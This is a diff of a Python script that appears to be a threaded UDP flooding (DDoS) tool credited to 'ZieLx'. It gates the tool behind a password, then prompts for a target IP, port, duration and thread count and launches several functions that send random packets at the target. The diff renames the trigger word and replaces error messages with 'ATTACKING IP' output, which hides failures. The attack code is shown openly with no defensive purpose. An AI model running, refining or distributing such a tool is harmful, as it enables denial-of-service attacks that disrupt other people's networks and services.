@@ -9,18 +9,18 @@ import time
 from time import sleep
 
 os.system("clear")
-password ="zielxddos"
+password ="zielx"
 
 for i in range(3):
-	pwd = input("[•] ENTER PASSWORD : ")
+	pwd = input("[•] Password : ")
 	j=3
 	if(pwd==password):
 		time.sleep(5)
-		print("[•] WAIT FOR 5 SECONDS!!! ")
+		print("[•] Correct...")
 		break
 	else:
 		time.sleep(5)
-		print("\033[92m[×] WRONG PASSWORD!!! ")
+		print("\033[91m[×] WRONG PASSWORD!!! ")
 		continue
 time.sleep(5)
 print("[•] Your Account Has Been Accepted! \033[92m[√]\033[0m ")
@@ -45,7 +45,7 @@ print("\033[92m>>> Coded : ZieLx")
 print("\033[92m>>>> Don't Abuse Kontol")
 ip = str(input("[+] Ip Target : "))
 port = int(input("[-] Port Target : "))
-choice = str(input("[+] Ready?? (ddos/n) : "))
+choice = str(input("[+] Ready?? (ready/n) : "))
 times = int(input("[-] Times : "))
 threads = int(input("[+] Threads : "))
 os.system("clear")
@@ -60,7 +60,8 @@ def ddos():
 				s.sendto(data,addr)
 			print(i +"\u001b[31m ZIELX ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
 		except:
-			print("\033[92m [!] Error!KO!KO!KOK1ko1xuxaw")
+			print("\u001b[31m ZIELX ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
+
 
 def ddos2():
 	data = random._urandom(1025)
@@ -75,7 +76,8 @@ def ddos2():
 			print(i +"\u001b[31m ZIELX ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
 		except:
 			s.close()
-			print("\033[92m [!] Error!KO!KO!KOK1ko1xuxaw")
+			print("\u001b[31m ZIELX ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
+
 
 def ddos3():
 	data = random._urandom(1025)
@@ -90,10 +92,11 @@ def ddos3():
 			print(i +"\u001b[31m ZIELXXX ATTACKING TO\033[92m ====> {}:{} \u001b[31m".format(ip, port))
 		except:
 			s.close()
-			print("\033[92m [!] MT KAH MANISZZZ?")
+			print("\u001b[31m ZIELX ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
+
 
 for y in range(threads):
-	if choice == 'ddos':
+	if choice == 'ready':
 		th = threading.Thread(target = ddos)
 		th.start()
 		th = threading.Thread(target = ddos2)
